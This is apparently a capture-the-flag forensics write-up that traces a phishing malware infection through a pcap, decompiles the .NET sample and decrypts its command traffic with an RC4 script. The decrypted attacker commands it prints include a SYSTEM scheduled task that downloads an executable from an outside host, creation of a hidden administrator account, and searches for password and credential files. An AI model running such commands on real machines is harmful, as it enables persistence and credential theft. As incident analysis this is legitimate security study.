# Silent Trap
### A critical incident has occurred in Tales from Eldoria, trapping thousands of players in the virtual world with no way to log out. The cause has been traced back to Malakar, a mysterious entity that launched a sophisticated attack, taking control of the developers' and system administrators' computers. With key systems compromised, the game is unable to function properly, which is why players remain trapped in Eldoria. Now, you must investigate what happened and find a way to restore the system, freeing yourself from the game before it's too late.

The challenge starts with a **pcap** file, looking at it quickly, it's an email exchange.

### Flag 1 : What is the subject of the first email that the victim opened and replied to ?

The subject of the email can be identified on the HTTP Stream 4 :

![wireshark1](https://github.com/user-attachments/assets/4912275e-7eec-40b0-a9f0-e22b95711e61)  

### Flag 2 : Question 2: On what date and time was the suspicious email sent ?

Continuing to search in the HTTP Streams, we come across this on the 8 :  
![wiresahrk2](https://github.com/user-attachments/assets/58814647-dba8-4678-ab40-14953ef00c81)  

We can see the date of the email, and the sending of the file `Eldoria_Balance_Issue_Report.zip`.

### Flag 3 : What is the MD5 hash of the malware file ?

We then export this file with Wireshark, but the archive is protected by a password: 

![wireshark3](https://github.com/user-attachments/assets/4aa0c099-ed5c-44cb-a8ef-7be54c912184)
![zip mdp](https://github.com/user-attachments/assets/6042393e-d16d-499b-ac1f-21bc450eaa27)

We then continue to search the emails a little, and we find the email exchange with the password : 



We can therefore access the zip archive and extract `Eldoria_Balance_Issue_Report.pdf.exe` after cleaning it with :
```bash
dd if=Eldoria.zip of=clean2.zip bs=1 skip=1259
 ```
Then we can retrieve its md5 hash :

![extraire](https://github.com/user-attachments/assets/75a48aab-0a4a-447f-8207-8f3363ba4ca4)
![md5](https://github.com/user-attachments/assets/ea3af082-033e-45f6-8b8b-b4d998318001)

### Flag 4 :  What credentials were used to log into the attacker’s mailbox ?

So now we have access to the malware, which is a `.NET executable.` We disassemble it using dotPeek.

In the first visible function, we can directly find the creds, also visible in the Wireshark frames.

![creds](https://github.com/user-attachments/assets/dfee5cd9-c035-4a07-a0bb-955f2eec7db1)

### Flag 5 :  What is the name of the task scheduled by the attacker ?

Now we need to understand how this encryption works, so we can decrypt the rest of the frames in the Wireshark capture. Here we can understand a little more about what's happening :

![fonctionnement file](https://github.com/user-attachments/assets/8da47bde-ce7e-4e6c-a684-5a7a6074b9cd)

The malware attempts to connect to a mail server and then executes XOR and base64 encoded CMD commands, probably to extract files, according to the Wireshark frames.

By the way, thanks to @Kaddate for helping me fully understand everything that was going on in this program :D

Digging deeper, we then discover how the encryption works, and we find the XOR key, which itself is encrypted with RC4.

 ![xor key](https://github.com/user-attachments/assets/44b4dc62-28bc-4990-b582-8b9678c99c4b)
 ![exor](https://github.com/user-attachments/assets/0615f2a4-9ca1-4bc6-bc6f-7cd46b8ce7bc)

Now that we have all this information, we can decrypt the CMD commands that the attacker executes on the server by extracting all the IMF trams after a FETCH from the attacker : 

![ttt](https://github.com/user-attachments/assets/76911b01-abf9-4dfd-bf26-fc4e65f835b3)

Then, with this code :
```python
import base64

def rc4(key, data):
    S = list(range(256))
    j = 0
    out = bytearray()

    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) % 256
        S[i], S[j] = S[j], S[i]

    i = j = 0
    for byte in data:
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        out.append(byte ^ S[(S[i] + S[j]) % 256])

    return bytes(out)

b64_data = """<data>"""
key = bytes([<xor_key>]) 

data = base64.b64decode(b64_data)
decrypted = rc4(key, data)

print(decrypted.decode(errors="ignore"))
```
(Thanks to @n0rozapy for this script !)  
We can now decrypt all the commands that the attacker sends, we then obtain :
```powershell
wmic qfe get Caption,Description,HotFixID,InstalledOn

schtasks /create /tn Synchronization /tr "powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://www.mediafire.com/view/wlq9mlfrl0nlcuk/rakalam.exe/file -OutFile C:\Temp\rakalam.exe" /sc minute /mo 1 /ru SYSTEM

net user devsupport1 P@ssw0rd /add
net localgroup Administrators devsupport1 /add
reg query HKLM /f "password" /t REG_SZ /s
dir C:\ /s /b | findstr "password"

more "C:\Users\dev-support\AppData\Local\BraveSoftware\Brave-Browser\User Data\ZxcvbnData\3\passwords.txt"
more C:\backups\credentials.txt
whoami /priv
tasklist /v
```
The name of the executed task is **Synchronization**.

### Flag What is the API key leaked from the highly valuable file discovered by the attacker ?
Here we see that the attacker is looking inside the `credentials.txt` file, we can also clearly see the server's response in Wireshark, therefore the file `credentials.txt` :

![api key](https://github.com/user-attachments/assets/88b839db-e126-4565-a11b-261f94ca1e84)

We export all of this, then pass it into the same python script as for the CMD commands. Which gives us :

![api key finale](https://github.com/user-attachments/assets/47c51d14-206e-45da-a107-79f1f823d73b)

And voilà ! 6/6 Flags.
